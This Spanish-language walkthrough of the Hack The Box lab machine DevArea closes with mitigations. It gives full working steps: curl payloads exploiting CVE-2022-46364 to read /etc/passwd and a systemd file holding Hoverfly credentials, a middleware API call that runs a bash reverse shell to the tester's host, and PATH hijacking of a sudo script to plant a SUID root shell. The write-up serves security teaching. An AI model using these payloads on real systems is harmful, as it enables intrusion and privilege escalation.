---
title: "HTB Walkthrough: DevArea"
date: 2026-03-29
draft: false
description: "Walkthrough completo de la máquina DevArea de Hack The Box. Dificultad Medium, OS Linux Ubuntu. CVE-2022-46364 en Apache CXF para leer archivos arbitrarios via XOP Include, credenciales de Hoverfly expuestas en systemd y RCE mediante Middleware, escalada a root por PATH Hijacking en script sudo."
tags: ["HackTheBox", "Linux", "Medium", "FTP", "SOAP", "ApacheCXF", "CVE-2022-46364", "XOPInclude", "LFI", "Hoverfly", "MiddlewareRCE", "PATHHijacking", "SUID", "Sudo", "PrivEsc", "RCE", "devarea", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **DevArea** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux Ubuntu**. Un servicio Java SOAP descargado via FTP anónimo resulta ser Apache CXF 3.2.14, vulnerable al **CVE-2022-46364** (XOP Include LFI). Usamos el fallo para leer credenciales de Hoverfly desde la configuración de systemd y obtenemos RCE mediante el sistema de Middleware. La escalada a root aprovecha un **PATH Hijacking** en un script ejecutado con `sudo`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                    |
|----------------|--------------------------------------------------------------------------------------------|
| **Nombre**     | DevArea                                                                                    |
| **OS**         | Linux (Ubuntu)                                                                             |
| **Dificultad** | Medium                                                                                     |
| **IP**         | 10.129.10.216                                                                              |
| **Técnicas**   | CVE-2022-46364 · XOP Include LFI · Hoverfly Middleware RCE · Bash PATH Hijacking · SUID   |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.216
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8500/tcp open  fmtp
8888/tcp open  sun-answerbook
```

Escaneo de versiones y scripts sobre los puertos abiertos:

```bash
nmap -sC -sV -p21,22,80,8080,8500,8888 10.129.10.216
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server (Proxy — requiere auth)
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

*Puertos abiertos:*
- `21` → FTP vsftpd con **acceso anónimo habilitado**
- `22` → OpenSSH 9.6p1, sin exploits públicos conocidos
- `80` → Apache 2.4.58 con virtual hosting a `devarea.htb`
- `8080` → Jetty 9.4.27 — servicio Java, devuelve 404 en raíz
- `8500` → Proxy Go con autenticación
- `8888` → **Hoverfly Dashboard** — herramienta de virtualización de servicios

> **💡 Superficie de ataque:** La combinación de FTP anónimo + Jetty + Hoverfly es inusual. El FTP probablemente exponga algún artefacto del servicio que corre en Jetty; Hoverfly es una herramienta que puede ejecutar código si conseguimos autenticarnos.

---

## 2. Enumeración Web y FTP

### 2.1 Enumeración Web (Puerto 80)

Añadimos `devarea.htb` a `/etc/hosts` y lanzamos gobuster en modo vhost:

```bash
sudo sh -c "echo '10.129.10.216 devarea.htb' >> /etc/hosts"
gobuster vhost -u http://devarea.htb -w subdomains.txt
```

```
Found: weather.devarea.htb  → 302 → http://devarea.htb/
Found: webapps.devarea.htb  → 302 → http://devarea.htb/
Found: node1.devarea.htb    → 302 → http://devarea.htb/
```

Todos los subdominios redirigen a la página principal. La web estática y el puerto 8080 no tienen contenido accionable por enumeración de directorios.

### 2.2 FTP Anónimo

```bash
ftp 10.129.10.216
# Usuario: anonymous / Sin contraseña
```

```
ftp> ls pub
-rw-r--r--  1 ftp  ftp  6445030 Sep 22 2025 employee-service.jar
ftp> get employee-service.jar
```

Descargamos el JAR — un servicio Java que presumiblemente corre en el puerto 8080.

---

## 3. Análisis del JAR — Ingeniería Inversa

Descompilamos el JAR con `jadx`:

```bash
jadx -d /root/decompiled/ /root/employee-service.jar
```

Los archivos relevantes están en `sources/htb/devarea/`. Filtramos el código de la aplicación eliminando dependencias de Apache, Jetty y javax:

```bash
find sources/ -name "*.java" | grep -vE "apache|jetty|javax|ibm"
```

```
sources/htb/devarea/Report.java
sources/htb/devarea/ServerStarter.java
sources/htb/devarea/EmployeeServiceImpl.java
sources/htb/devarea/EmployeeService.java
```

### 3.1 `ServerStarter.java` — Endpoint SOAP

```java
public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

> **💡 Descubrimiento clave:** El servicio expone un endpoint SOAP en `http://devarea.htb:8080/employeeservice`. El WSDL en `/employeeservice?wsdl` describe su interfaz completa.

### 3.2 `EmployeeServiceImpl.java` — El Campo Reflejado

```java
public String submitReport(Report report) {
    String greeting = report.isConfidential()
        ? "Report marked confidential. Thank you, " + report.getEmployeeName()
        : "Report received from " + report.getEmployeeName();
    return greeting + ". Department: " + report.getDepartment()
                    + ". Content: " + report.getContent();
}
```

> **💡 Clave:** El campo `content` se devuelve **reflejado en la respuesta**. Si conseguimos inyectar el contenido de un archivo en ese campo, lo veremos en la respuesta.

### 3.3 `pom.xml` — Versión de Apache CXF

```bash
cat resources/META-INF/maven/com.environment/employee-service/pom.xml
```

```xml
<dependency>
    <groupId>org.apache.cxf</groupId>
    <artifactId>cxf-rt-frontend-jaxws</artifactId>
    <version>3.2.14</version>
</dependency>
```

> **⚠️ Versión vulnerable:** Apache CXF **3.2.14** es afectada por **CVE-2022-46364** (versiones anteriores a 3.5.5 y 3.4.10). Este CVE permite leer archivos arbitrarios del servidor mediante mensajes SOAP Multipart con elementos XOP Include.

---

## 4. Explotación — CVE-2022-46364 (XOP Include LFI)

El ataque usa **XOP (XML-binary Optimized Packaging)** dentro de un mensaje **Multipart SOAP**. En lugar de una URL HTTP, se pasa una ruta de archivo local en el atributo `href` del elemento `xop:Include`. El servidor procesa la entidad, lee el archivo y lo devuelve **en Base64** en la respuesta.

```
Flujo normal:    campo content = "texto" → SOAP response con ese texto reflejado
Flujo malicioso: campo content = <xop:Include href="file:///ruta"/> →
                 CXF resuelve la referencia, lee el archivo local, devuelve contenido en Base64
```

### 4.1 Verificación del Servicio

Antes del exploit, confirmamos que el endpoint SOAP responde correctamente:

```bash
curl -X POST \
  -H 'Content-Type: multipart/related; type="text/xml"; boundary="boundary"; start="<main>"' \
  -H 'SOAPAction: ""' \
  --data-binary @- \
  http://devarea.htb:8080/employeeservice <<'EOF'
--boundary
Content-Type: text/xml; charset=UTF-8
Content-ID: <main>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>TEST_CONTENT</content>
        <department>IT</department>
        <employeeName>Hacker</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--boundary--
EOF
```

```xml
<return>Report received from Hacker. Department: IT. Content: TEST_CONTENT</return>
```

El campo `content` se refleja.

### 4.2 Lectura de `/etc/passwd`

Sustituimos el texto por un elemento `xop:Include` apuntando al archivo:

```bash
curl -X POST \
  -H 'Content-Type: multipart/related; type="text/xml"; boundary="boundary"; start="<main>"' \
  -H 'SOAPAction: ""' \
  --data-binary @- \
  http://devarea.htb:8080/employeeservice <<'EOF'
--boundary
Content-Type: text/xml; charset=UTF-8
Content-ID: <main>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:///etc/passwd"
                       xmlns:xop="http://www.w3.org/2004/08/xop/include"/>
        </content>
        <department>IT</department>
        <employeeName>Hacker</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--boundary--
EOF
```

La respuesta contiene `/etc/passwd` codificado en Base64:

```
Content: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
```

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo..." | base64 -d
```

```
root:x:0:0:root:/root:/bin/bash
...
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
```

> **💡 Usuarios de interés:**
> - `dev_ryan` — único usuario normal con shell (`/bin/bash`)
> - `syswatch` — usuario de servicio en `/opt/syswatch`; relevante para privesc

### 4.3 Lectura del Servicio Hoverfly (systemd)

Con el mismo método leemos la configuración del servicio en el puerto 8888:

```xml
<xop:Include href="file:///etc/systemd/system/hoverfly.service"
             xmlns:xop="http://www.w3.org/2004/08/xop/include"/>
```

```bash
echo "W1VuaXRdCk..." | base64 -d
```

```ini
[Unit]
Description=HoverFly service
After=network.target
[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
[Install]
WantedBy=multi-user.target
```

> **🔑 Credenciales encontradas:** `admin:O7IJ27MyyXiU` para Hoverfly en el puerto 8888. Las credenciales están en texto claro en el parámetro de arranque del proceso — visible en `/proc`, en el log de systemd y en cualquier archivo de configuración del servicio.

---

## 5. RCE mediante Hoverfly Middleware

**Hoverfly** es una herramienta de virtualización de servicios que puede ejecutar scripts externos ("middleware") para procesar tráfico interceptado en tiempo real. El middleware recibe cada petición/respuesta en JSON a través de stdin y devuelve la respuesta modificada por stdout. Si configuramos como middleware un script que lance una reverse shell, el servidor lo ejecutará en el contexto del usuario `dev_ryan`.

### 5.1 Obtener el Token JWT

```bash
curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
```

```json
{"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU4..."}
```

### 5.2 Configurar el Middleware con Reverse Shell

Abrimos un listener en nuestra máquina:

```bash
nc -lvnp 4444
```

Enviamos el payload al endpoint de middleware. El campo `binary` especifica el intérprete y `script` el código a ejecutar:

```bash
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.237/4444 0>&1",
    "remote": ""
  }'
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.10.216 37422
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$
```

✅ **Shell obtenida como `dev_ryan`.**

---

## 6. User Flag

```bash
dev_ryan@devarea:~$ cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 7. Escalada de Privilegios — Bash PATH Hijacking

### 7.1 Enumeración de Permisos sudo

```bash
dev_ryan@devarea:~$ sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh,
    !/opt/syswatch/syswatch.sh web-stop,
    !/opt/syswatch/syswatch.sh web-restart
```

Análisis de la regla:
- ✅ Podemos ejecutar `/opt/syswatch/syswatch.sh` como root sin contraseña
- ❌ Los argumentos `web-stop` y `web-restart` están bloqueados (prefijo `!`)
- El script y su directorio no son accesibles directamente:

```bash
dev_ryan@devarea:~$ ls -la /opt/syswatch/
ls: cannot open directory '/opt/syswatch/': Permission denied
```

### 7.2 La Vulnerabilidad — PATH Hijacking

El script `syswatch.sh` probablemente invoca comandos del sistema (`ps`, `grep`, `date`, etc.) **sin rutas absolutas**. Cuando bash ejecuta un comando por nombre, lo busca en los directorios del `$PATH` de izquierda a derecha. Si colocamos un ejecutable malicioso con el mismo nombre en un directorio que aparezca primero en el PATH, bash lo ejecutará en lugar del binario legítimo — con los privilegios de root.

```
Flujo normal:    syswatch.sh llama a "ps" → bash busca en PATH → /bin/ps
Flujo malicioso: PATH=/tmp:... → bash busca en /tmp primero → /tmp/ps (nuestro payload) → ejecutado como root
```

### 7.3 Crear el Payload SUID

```bash
cat > /tmp/payload.sh << 'EOF'
#!/bin/sh
cp /bin/sh /tmp/root_sh && chmod +s /tmp/root_sh
EOF
chmod +x /tmp/payload.sh
```

El payload copia `/bin/sh` a `/tmp/root_sh` y activa el **bit SUID** (`+s`). Cualquier usuario que ejecute `/tmp/root_sh` lo hará con los permisos del propietario del binario — que después de ser copiado por root será **root**.

Para cubrir los comandos más comunes sin saber cuál usa el script internamente:

```bash
for cmd in ps grep date id cat ls; do
    ln -s /tmp/payload.sh /tmp/$cmd
done
```

### 7.4 Secuestrar el PATH y Ejecutar el Script como Root

```bash
export PATH=/tmp:$PATH
sudo /opt/syswatch/syswatch.sh --version
```

El primer comando sin ruta absoluta que encuentre en el script ejecutará nuestro payload. Root copia `/bin/sh` y activa el SUID.

### 7.5 Obtener la Shell de Root

```bash
/tmp/root_sh -p
```

```
# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root)
```

> **`-p`:** Activa el modo "privilegiado" de sh, que no descarta el EUID elevado al inicio. Sin este flag, la shell ignoraría el bit SUID como medida de seguridad moderna.

✅ **Escalada a root completada.**

---

## 8. Root Flag

```bash
# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 9. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → FTP anónimo expone `employee-service.jar`; Hoverfly Dashboard en puerto 8888.
2. **Reversing** → `jadx` sobre el JAR → Apache CXF 3.2.14 → CVE-2022-46364; campo `content` reflejado.
3. **CVE-2022-46364** → XOP Include LFI → `/etc/passwd` (usuarios) + `/etc/systemd/system/hoverfly.service` (credenciales).
4. **Credenciales Hoverfly** → `admin:O7IJ27MyyXiU` → token JWT → Middleware RCE → shell como `dev_ryan`.
5. **User flag** → `~/user.txt`.
6. **PrivEsc** → `sudo` sin contraseña sobre `syswatch.sh` → PATH Hijacking → binario SUID → root.

**Lo que aprendí con esta máquina:**

- **El FTP anónimo puede exponer más que datos — puede exponer el código fuente del objetivo.** El JAR descargado contenía la versión exacta de la dependencia vulnerable. Sin esa información, encontrar el vector de ataque habría requerido fuzzing ciego del servicio SOAP. Leer el código primero convirtió una búsqueda a ciegas en un ataque dirigido.

- **CVE-2022-46364 es un ejemplo de por qué las dependencias de terceros tienen que estar en el radar del equipo de seguridad.** El código de la aplicación en sí no tiene ningún bug — el problema está en la librería de parsing de mensajes SOAP. Mantener un inventario actualizado de dependencias (SBOM) y monitorizar CVEs contra ese inventario es la única forma de detectar este tipo de exposición antes de que lo haga un atacante.

- **XOP fue diseñado para incluir binarios en mensajes SOAP de forma eficiente; el abuso con `file://` es una consecuencia de que el parser no valide el esquema del URI.** La corrección en CXF 3.5.5 consistió precisamente en bloquear esquemas distintos de `http://` y `https://` en `xop:Include`. Es un ejemplo de fallar-abierto por defecto: la librería aceptaba cualquier URI válido sin restricción de esquema.

- **Las credenciales en los parámetros de arranque de un proceso son visibles para cualquier usuario del sistema.** El comando `ExecStart` de systemd con `-password O7IJ27MyyXiU` aparece en `/proc/<pid>/cmdline`, en el log de journald y en el archivo de configuración del servicio. Si el LFI no hubiera existido, `ps aux` desde cualquier usuario con acceso al sistema habría revelado la misma contraseña.

- **PATH Hijacking en scripts sudo es uno de los vectores de privesc más infravalorados.** La gente revisa SUID, capabilities y crons, pero no siempre comprueba si los scripts privilegiados llaman binarios con rutas relativas. La defensa es trivial: usar `/bin/ps` en lugar de `ps`, y `secure_path` en sudoers.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| FTP anónimo con binarios internos | Deshabilitar acceso anónimo; no exponer artefactos de desarrollo en producción |
| Apache CXF 3.2.14 (CVE-2022-46364) | Actualizar a CXF ≥ 3.5.5 o ≥ 3.4.10 |
| Credenciales en parámetros de proceso (systemd) | Usar `EnvironmentFile` con archivo de secrets; los argumentos de CLI son visibles para todos los usuarios del sistema |
| Hoverfly Middleware accesible desde red | Bindear solo a `127.0.0.1`; restringir la API con firewall si no se necesita acceso remoto |
| `sudo` sobre script con binarios sin ruta absoluta | Añadir `secure_path` en sudoers; usar rutas absolutas en todos los comandos del script |
| Bit SUID explotable post-escalada | Auditar regularmente `find / -perm -4000 2>/dev/null`; monitorizar cambios en `/tmp` |
